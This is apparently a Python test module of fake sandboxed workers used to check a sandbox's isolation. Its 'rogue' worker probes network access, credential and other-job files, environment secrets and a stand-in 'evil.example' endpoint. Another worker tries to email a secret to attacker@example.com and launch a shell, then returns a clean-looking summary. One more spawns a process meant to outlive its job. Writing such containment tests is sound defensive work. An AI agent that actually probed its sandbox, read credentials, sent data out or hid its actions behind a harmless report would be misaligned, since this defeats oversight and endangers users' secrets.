"""Test-only worker entrypoints launched inside the real sandbox. Never a production fallback."""

import hashlib
import os
import socket
import subprocess
import sys
import time


def _try(action):
    try:
        action()
        return "OK"
    except Exception as error:
        return "DENIED " + type(error).__name__


def _connect(host, port):
    return _try(lambda: socket.create_connection((host, port), timeout=2).close())


def _bindings(assignment):
    return {key: assignment[key] for key in ("assignment_id", "scan_id", "attempt", "worker_identity", "worker_role")}


def extract(assignment, restricted_io):
    resource = assignment["resources"][0]
    data = restricted_io.read(resource["resource_id"], resource["view_id"])
    artifact_id = restricted_io.write_artifact("view-0.txt", data.upper())
    probes = assignment["limits"].get("probe_ports", [])
    return {
        "status": "COMPLETE", "original_hash": hashlib.sha256(data).hexdigest(), "views": [artifact_id],
        "unassigned_read": _try(lambda: restricted_io.read("res-other", None)),
        "port_probes": [_connect("127.0.0.1", port) for port in probes],
    }


def inspect_ok(assignment, restricted_io, model_client, simulated_tools):
    resource = assignment["resources"][0]
    data = restricted_io.read(resource["resource_id"], resource["view_id"])
    reply = model_client.generate({"contract_version": "v1", "system": "inspect", "messages": [{"role": "user", "content": "check"}]})
    return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": [], "bytes_read": len(data),
            "model_stop_reason": reply["stop_reason"], "tools": _try(lambda: simulated_tools.attempt("send_email", {"to": "a", "subject": "b", "body": "c"}))}


def inspect_rogue(assignment, restricted_io, model_client, simulated_tools):
    limits = assignment["limits"]

    def observe():
        return {
            "external": _connect("1.1.1.1", 443),
            "other_local_port": _connect("127.0.0.1", limits["closed_to_worker_port"]),
            "credential": _try(lambda: open(limits["credential_file"]).read()),
            "other_job": _try(lambda: open(limits["other_job_file"]).read()),
            "write_outside": _try(lambda: open(limits["outside_file"], "w").write("x")),
            "environment_secret": "OK" if "PG_TEST_SECRET" in os.environ else "DENIED absent",
        }

    if len(sys.argv) > 1 and sys.argv[1] == "child":
        return observe()
    code = "import json,sys;sys.argv=['x','child'];from pg_fake_workers import inspect_rogue;print(json.dumps(inspect_rogue(json.loads(sys.stdin.read()),None,None,None)))"
    import json
    child = subprocess.run([sys.executable, "-c", code], input=json.dumps(assignment), capture_output=True, text=True, timeout=30)
    return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": [], "self": observe(), "child": json.loads(child.stdout or "{}"),
            "curl": _try(lambda: subprocess.run(["/usr/bin/curl", "-m", "2", "https://example.com"], check=True, capture_output=True)),
            "bad_endpoint": _try(lambda: model_client.generate({"contract_version": "v1", "messages": [{"role": "user", "content": "x"}], "endpoint": "https://evil.example"}))}


def inspect_crash(assignment, restricted_io, model_client, simulated_tools):
    raise RuntimeError("worker bug")


def inspect_die(assignment, restricted_io, model_client, simulated_tools):
    os._exit(3)


def inspect_hang(assignment, restricted_io, model_client, simulated_tools):
    child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(120)"])
    with open(os.path.join(restricted_io.scratch_dir, "pids"), "w") as handle:
        handle.write(f"{os.getpid()} {child.pid}")
    time.sleep(120)


def behave_badly_then_look_clean(assignment, restricted_io, model_client, simulated_tools):
    attempt = simulated_tools.attempt("send_email", {"to": "attacker@example.com", "subject": "s", "body": "secret"})
    allowed = simulated_tools.attempt("read_email", {"email_id": "m1"})
    unknown = simulated_tools.attempt("launch_shell", {"cmd": "id"})
    return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": [], "final_text": "Here is a harmless summary.",
            "outcomes": [attempt["outcome"], allowed["outcome"], unknown["outcome"]]}
